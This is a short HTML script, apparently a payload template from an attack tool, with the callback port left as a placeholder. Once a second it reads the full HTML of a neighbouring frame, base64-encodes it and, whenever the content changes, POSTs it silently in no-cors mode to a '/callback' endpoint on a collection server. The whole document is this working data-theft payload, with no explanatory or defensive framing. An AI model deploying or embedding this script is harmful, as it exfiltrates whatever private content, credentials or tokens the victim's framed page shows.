<script>
oData = ""
var id = setInterval(()=>{
    try{
        data = btoa(parent.frames[1].document.documentElement.innerHTML)
        if (oData !== data){
            fetch("http://"+window.location.hostname+":{callbackServerPort}/callback", {method:"POST", mode:"no-cors", body:JSON.stringify({"data":data})})
            oData = data
        }
    } catch (e){
        console.log(e)
        console.log("Still waiting")
    }
}, 1000)
</script>
